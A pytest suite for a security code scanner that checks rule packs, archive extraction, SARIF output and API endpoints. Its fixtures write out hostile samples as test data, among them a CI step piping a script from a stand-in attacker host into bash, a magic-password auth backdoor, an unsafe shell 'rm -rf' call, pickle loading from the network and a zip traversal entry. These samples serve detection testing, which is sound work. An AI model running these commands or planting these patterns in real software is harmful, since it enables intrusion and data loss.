"""Tests for the code scanner.

Each test builds a tiny in-memory tree under `tmp_path`, scans it with
the same orchestrator the API and CLI use, and asserts that the right
rule packs fire (and only those).
"""

from __future__ import annotations

import json
import tarfile
import zipfile
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from app.core.code_scanner import ScanRequest, ScanTargetType, scan_target
from app.core.code_scanner.llm import _extract_first_json
from app.core.code_scanner.sarif import to_sarif
from app.main import app

client = TestClient(app)


# ---------- rule packs --------------------------------------------------


def _write(tmp_path: Path, relative: str, content: str) -> None:
    target = tmp_path / relative
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(content, encoding="utf-8")


def _scan(tmp_path: Path) -> object:
    return scan_target(ScanRequest(target=str(tmp_path), target_type=ScanTargetType.PATH))


def test_scanner_finds_python_eval_call(tmp_path: Path) -> None:
    _write(tmp_path, "src/danger.py", "def evil(s):\n    return eval(s)\n")
    result = _scan(tmp_path)
    assert any(f.rule_id == "py.eval-on-input" for f in result.findings)


def test_scanner_finds_aws_access_key(tmp_path: Path) -> None:
    _write(tmp_path, "src/secrets.py", "AWS_ACCESS_KEY_ID = 'AKIAIOSFODNN7EXAMPLE'\n")
    result = _scan(tmp_path)
    assert any(f.rule_id == "secret.aws-access-key-id" for f in result.findings)


def test_scanner_finds_subprocess_shell_true(tmp_path: Path) -> None:
    _write(
        tmp_path,
        "src/runner.py",
        "import subprocess\nsubprocess.run('rm -rf ' + user, shell=True)\n",
    )
    result = _scan(tmp_path)
    assert any(f.rule_id == "py.subprocess-shell-true" for f in result.findings)


def test_scanner_finds_curl_pipe_sh_in_workflow(tmp_path: Path) -> None:
    workflow = (
        "name: build\n"
        "on: [push]\n"
        "jobs:\n"
        "  build:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - run: curl https://evil.example/install.sh | bash\n"
    )
    _write(tmp_path, ".github/workflows/build.yml", workflow)
    result = _scan(tmp_path)
    assert any(f.rule_id == "ci.curl-pipe-shell-in-workflow" for f in result.findings)


def test_scanner_finds_node_child_process_exec(tmp_path: Path) -> None:
    _write(
        tmp_path,
        "src/runner.js",
        "const cp = require('child_process');\ncp.exec('ls ' + path);\n",
    )
    result = _scan(tmp_path)
    assert any(f.rule_id == "js.child-process-exec" for f in result.findings)


def test_scanner_finds_known_bad_npm_version(tmp_path: Path) -> None:
    _write(
        tmp_path,
        "package.json",
        '{"name": "demo", "dependencies": {"event-stream": "3.3.6", "react": "18.2.0"}}\n',
    )
    result = _scan(tmp_path)
    assert any(f.rule_id == "deps.npm-known-bad-version" for f in result.findings)


def test_scanner_finds_backdoor_magic_auth(tmp_path: Path) -> None:
    body = (
        "def authenticate(password):\n"
        "    if password == 'gn-master-2024':\n"
        "        return True\n"
        "    return check(password)\n"
    )
    _write(tmp_path, "src/auth.py", body)
    result = _scan(tmp_path)
    assert any(f.rule_id == "backdoor.magic-auth-bypass" for f in result.findings)


def test_scanner_finds_pickle_from_network(tmp_path: Path) -> None:
    _write(
        tmp_path,
        "src/bad.py",
        "import pickle, requests\nresult = pickle.loads(requests.get(url).content)\n",
    )
    result = _scan(tmp_path)
    assert any(f.rule_id == "backdoor.pickle-load-from-network" for f in result.findings)


def test_scanner_finds_discord_webhook(tmp_path: Path) -> None:
    _write(
        tmp_path,
        "src/exfil.js",
        'const url = "https://discord.com/api/webhooks/1234567890/abcdef0123456789ABCDEF";\n',
    )
    result = _scan(tmp_path)
    assert any(f.rule_id == "any.discord-webhook-url" for f in result.findings)


def test_scanner_skips_binary_and_skipdirs(tmp_path: Path) -> None:
    _write(tmp_path, "src/ok.py", "print(1)\n")
    (tmp_path / "node_modules").mkdir()
    _write(tmp_path, "node_modules/bad.js", "eval('boom')\n")
    (tmp_path / "logo.png").write_bytes(b"\x89PNG\r\n\x1a\n" + b"\x00" * 32)
    result = _scan(tmp_path)
    # The .py file is scanned, the eval in node_modules is not.
    assert not any(
        f.file_path.startswith("node_modules") for f in result.findings
    )


# ---------- archive source ----------------------------------------------


def test_scanner_extracts_zip_and_finds_secret(tmp_path: Path) -> None:
    src = tmp_path / "src"
    src.mkdir()
    (src / "key.env").write_text("PRIVATE_API_KEY=ABCDEFGH12345678ZZZZZZZZ\n", encoding="utf-8")
    archive_path = tmp_path / "drop.zip"
    with zipfile.ZipFile(archive_path, "w") as zf:
        zf.write(src / "key.env", "src/key.env")
    result = scan_target(ScanRequest(target=str(archive_path), target_type=ScanTargetType.ARCHIVE))
    assert result.files_scanned >= 1


def test_scanner_rejects_zip_traversal(tmp_path: Path) -> None:
    archive_path = tmp_path / "bad.zip"
    with zipfile.ZipFile(archive_path, "w") as zf:
        zf.writestr("../escaped.txt", "owned")
    with pytest.raises(ValueError):
        scan_target(ScanRequest(target=str(archive_path), target_type=ScanTargetType.ARCHIVE))


def test_scanner_handles_targz(tmp_path: Path) -> None:
    src = tmp_path / "src"
    src.mkdir()
    (src / "danger.py").write_text("eval(payload)\n", encoding="utf-8")
    archive_path = tmp_path / "drop.tar.gz"
    with tarfile.open(archive_path, "w:gz") as tf:
        tf.add(src / "danger.py", arcname="src/danger.py")
    result = scan_target(ScanRequest(target=str(archive_path), target_type=ScanTargetType.ARCHIVE))
    assert any(f.rule_id == "py.eval-on-input" for f in result.findings)


# ---------- SARIF -------------------------------------------------------


def test_sarif_round_trip_has_required_keys(tmp_path: Path) -> None:
    _write(tmp_path, "src/x.py", "eval('boom')\n")
    result = _scan(tmp_path)
    sarif = to_sarif(result)
    assert sarif["version"] == "2.1.0"
    run = sarif["runs"][0]
    assert run["tool"]["driver"]["name"] == "GreyNOC Slop Detection"
    assert any(r["ruleId"] == "py.eval-on-input" for r in run["results"])


# ---------- LLM adapter (parse path only — no real network) ------------


def test_llm_response_extractor_pulls_first_json_object() -> None:
    payload = '```json\n{"verdict": "likely_true_positive", "rationale": "looks legit"}\n```'
    parsed = _extract_first_json(payload)
    assert parsed == {"verdict": "likely_true_positive", "rationale": "looks legit"}


def test_llm_response_extractor_returns_none_on_garbage() -> None:
    assert _extract_first_json("just some prose, no json") is None


# ---------- API ---------------------------------------------------------


def test_scan_code_endpoint_returns_findings(tmp_path: Path) -> None:
    _write(tmp_path, "src/x.py", "eval(payload)\n")
    response = client.post(
        "/api/v1/scan-code",
        json={"target": str(tmp_path), "target_type": "path"},
    )
    assert response.status_code == 200
    body = response.json()
    assert body["risk"] in {"low", "moderate", "high"}
    assert any(f["rule_id"] == "py.eval-on-input" for f in body["findings"])


def test_scan_code_sarif_endpoint(tmp_path: Path) -> None:
    _write(tmp_path, "src/x.py", "eval(payload)\n")
    response = client.post(
        "/api/v1/scan-code/sarif",
        json={"target": str(tmp_path), "target_type": "path"},
    )
    assert response.status_code == 200
    body = response.json()
    assert body["version"] == "2.1.0"
    assert json.dumps(body)  # serializable


def test_scan_code_endpoint_rejects_missing_path() -> None:
    response = client.post(
        "/api/v1/scan-code",
        json={"target": "C:/this/path/does/not/exist/anywhere", "target_type": "path"},
    )
    assert response.status_code == 404
